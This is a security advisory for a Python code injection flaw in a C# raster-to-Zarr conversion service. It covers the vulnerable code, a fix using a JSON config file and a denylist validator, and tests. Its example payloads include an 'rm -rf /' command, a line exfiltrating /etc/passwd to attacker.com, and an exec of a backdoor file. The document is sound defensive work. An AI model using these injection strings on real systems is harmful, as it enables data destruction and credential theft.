# Critical Security Fix: Python Code Injection in ZarrTimeSeriesService

## Vulnerability Summary

**Severity**: CRITICAL
**CVSS Score**: 9.8 (Critical)
**CWE**: CWE-94 (Improper Control of Generation of Code - 'Code Injection')
**Date Fixed**: 2025-10-17
**Component**: `Honua.Server.Core.Raster.Cache.ZarrTimeSeriesService`

## Description

A critical Python code injection vulnerability was discovered in the `ZarrTimeSeriesService` class. The service generates Python scripts to convert raster data to Zarr format, but was directly interpolating user-controlled URIs and option values into the Python script using string interpolation.

### Vulnerable Code (Before Fix)

```csharp
private string GenerateConversionScript(string sourceUri, string zarrUri, ZarrConversionOptions options)
{
    return $@"
import xarray as xr
import zarr
import sys

try:
    # VULNERABLE: Direct string interpolation of user input
    ds = xr.open_dataset('{sourceUri.Replace("\\", "\\\\")}')
    da = ds['{options.VariableName}']

    encoding = {{
        '{options.VariableName}': {{
            'chunks': ({options.TimeChunkSize}, {options.LatitudeChunkSize}, {options.LongitudeChunkSize}),
            'compressor': zarr.Blosc(cname='{options.Compression}', clevel={options.CompressionLevel}),
        }}
    }}

    da.to_zarr('{zarrUri.Replace("\\", "\\\\")}', encoding=encoding, mode='w')
    ...
";
}
```

### Attack Vector

An attacker could inject arbitrary Python code by crafting malicious URIs or option values:

**Example 1: Remote Code Execution**
```
sourceUri = "http://evil.com/data.nc'; import os; os.system('rm -rf /'); #"
```

This would generate:
```python
ds = xr.open_dataset('http://evil.com/data.nc'; import os; os.system('rm -rf /'); #')
```

**Example 2: Data Exfiltration**
```
variableName = "temp'; import requests; requests.post('http://attacker.com', data=open('/etc/passwd').read()); #"
```

**Example 3: Privilege Escalation**
```
zarrUri = "/tmp/out.zarr'; exec(open('/tmp/backdoor.py').read()); #"
```

### Impact

- **Arbitrary Code Execution**: Attacker can execute any Python code with the privileges of the application
- **Data Breach**: Sensitive data could be exfiltrated to attacker-controlled servers
- **System Compromise**: Full system compromise possible if application runs with elevated privileges
- **Lateral Movement**: Could be used to attack other systems in the network

## Fix Implementation

The vulnerability was fixed using a two-layer defense-in-depth approach:

### Layer 1: JSON Configuration File (Primary Protection)

Instead of interpolating user input into Python code, all parameters are passed via a JSON configuration file:

```csharp
// Create JSON config with all parameters
var config = new
{
    sourceUri = sourceUri,
    zarrUri = zarrUri,
    variableName = options.VariableName,
    timeChunkSize = options.TimeChunkSize,
    latitudeChunkSize = options.LatitudeChunkSize,
    longitudeChunkSize = options.LongitudeChunkSize,
    compression = options.Compression,
    compressionLevel = options.CompressionLevel
};

var configPath = Path.Combine(Path.GetTempPath(), $"zarr_config_{Guid.NewGuid()}.json");
await File.WriteAllTextAsync(configPath, JsonSerializer.Serialize(config), cancellationToken);
```

The Python script now reads parameters from the JSON file:

```python
import json

# Read all parameters from JSON config file
with open('config.json', 'r') as f:
    config = json.load(f)

source_uri = config['sourceUri']
zarr_uri = config['zarrUri']
variable_name = config['variableName']
# ... etc

# Use variables instead of string literals
ds = xr.open_dataset(source_uri)
da = ds[variable_name]
```

### Layer 2: Input Validation (Defense-in-Depth)

Additional validation rejects inputs containing suspicious patterns:

```csharp
private static void ValidateInputForSecurity(string input, string parameterName)
{
    // Reject dangerous patterns
    var dangerousPatterns = new[]
    {
        "';",           // Python statement terminator
        "\";",          // Python statement terminator
        "\n",           // Newline (could inject new statements)
        "\r",           // Carriage return
        "import ",      // Python import statement
        "exec(",        // Python exec function
        "eval(",        // Python eval function
        "__import__",   // Python import function
        "subprocess",   // Subprocess module
        "os.system",    // OS command execution
    };

    foreach (var pattern in dangerousPatterns)
    {
        if (input.Contains(pattern, StringComparison.OrdinalIgnoreCase))
        {
            throw new ArgumentException(
                $"Input contains suspicious pattern '{pattern}' that could be used for code injection.",
                parameterName);
        }
    }

    // Reject control characters
    foreach (var ch in input)
    {
        if (char.IsControl(ch) && ch != '\t')
        {
            throw new ArgumentException(
                $"Input contains control character which is not allowed for security reasons.",
                parameterName);
        }
    }
}
```

## Testing

Comprehensive security tests were added in `ZarrTimeSeriesServiceSecurityTests.cs`:

- ✅ Rejects injection attempts in `sourceUri`
- ✅ Rejects injection attempts in `zarrUri`
- ✅ Rejects injection attempts in `variableName`
- ✅ Rejects injection attempts in `compression`
- ✅ Rejects null/whitespace inputs
- ✅ Accepts legitimate HTTP/HTTPS URIs
- ✅ Accepts legitimate S3 URIs
- ✅ Accepts legitimate file system paths
- ✅ Accepts complex but legitimate URIs with query parameters

## Files Modified

1. `/src/Honua.Server.Core/Raster/Cache/ZarrTimeSeriesService.cs`
   - Modified `ConvertToZarrAsync()` to use JSON config approach
   - Rewrote `GenerateConversionScript()` to read from JSON
   - Added `ValidateInputForSecurity()` method
   - Added security comments explaining the fix

2. `/tests/Honua.Server.Core.Tests/Raster/Cache/ZarrTimeSeriesServiceSecurityTests.cs` (NEW)
   - Comprehensive security test suite

## Remediation for Other Services

**Action Required**: Review all other services that generate code or scripts dynamically:

1. Search for similar patterns:
   ```bash
   grep -r "Process.Start" src/
   grep -r "ProcessStartInfo" src/
   grep -r "python" -i src/
   grep -r "exec" src/
   ```

2. Apply the same JSON config file pattern for any code generation
3. Never interpolate user input directly into code strings
4. Always validate and sanitize external input

## References

- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)

## Timeline

- **2025-10-17**: Vulnerability identified and fixed
- **2025-10-17**: Security tests added
- **2025-10-17**: Documentation created

## Credit

Security fix implemented as part of comprehensive security review of the Honua platform.
